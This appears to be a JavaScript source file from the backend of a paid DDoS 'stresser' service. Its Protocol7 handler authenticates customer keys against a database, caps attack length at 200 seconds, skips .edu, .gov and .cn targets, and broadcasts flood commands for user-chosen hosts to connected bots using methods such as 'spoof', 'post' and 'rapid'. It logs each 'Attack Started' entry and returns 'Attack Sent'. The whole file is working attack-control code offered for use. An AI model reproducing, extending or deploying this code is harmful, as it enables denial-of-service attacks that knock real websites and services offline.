const MongoManager = require('./MongoDBManger.js');
const Main = require('./SocketManager.js');
const fs = require('fs');
const axios = require('axios');


async function UserAuth(key)
{
  let user = await MongoManager.findUserByKey(key);
  if (!user) 
  {
    return 0;
  }
  if (user.Banned)
  {
    return 2;
  }
  return 3;
};

function ValidateReqtestData(Host, Time, Method, UserKey) 
{
    return Host && Time && Method && UserKey;
}

const blackList = ['.edu', '.gov', '.cn'];
let ConCurents = 0;

// I will shrink this method later PC.
const Protocol7 = async (req, res) => 
{
    const Host = req.query.host;
    const Port = req.query.port
    const Time =  req.query.time;
    const Method = req.query.method;
    const UserKey = req.query.key;
    if (!ValidateReqtestData(Host, Time, Method, UserKey)) 
    {
        return res.status(200).json({ error: 1, Message: 'Data is null' });
    }
    if (parseInt(Time) > 200) 
    {
        return res.status(200).json({ error: 1, Message: 'Sent time limit is 200 please retry with a valid sendtime!!!' });
    }
    if (blackList.some(banned => Host.includes(banned)))
    {
        return res.status(200).json({ error: 1, Message: 'Target is Blacklisted!!!' });
    }
    switch (await UserAuth(UserKey))
    {
        case 0:
            return res.status(200).json({ error: 1, Message: 'Key is not found in DB' });
        case 2:
            return res.status(200).json({ error: 1, Message: 'User is banned' });
    }
    if (ConCurents == 2 || ConCurents > 2) 
    {
        return res.status(200).json({ error: 1, Message: 'Please wait for a slot!!!' });
    }
    ConCurents++;
    switch (Method)
    {
        // Target | Time | RPS | Type | Threads | RR
        case 'get': 
            Main.broadcastMessage(`${Host}|${Time}|90|0|2|0`);
            break;
        case 'spoof':
            Main.broadcastMessage(`${Host}|${Time}|90|2|2|0`);
            break;
        case 'query':
            Main.broadcastMessage(`${Host}|${Time}|90|1|2|0`);
            break;
        case 'post':
            Main.broadcastMessage(`${Host}|${Time}|90|3|2|0`);
            break;
        case 'mix':
            Main.broadcastMessage(`${Host}|${Time}|90|4|2|0`);
            break;
        case 'rapid':
            Main.broadcastMessage(`${Host}|${Time}|90|2|2|1`);
            break;
    }
    setTimeout(function() 
    {
        ConCurents--;
    }, Time * 1000);
    fs.appendFileSync('Logs/Attacks.log', `Attack Started By ${UserKey} on ${Host}\n`);
    return res.status(200).json({ error: 0, Message: 'Attack Sent!!!!'});
};


module.exports = 
{
    Protocol7
}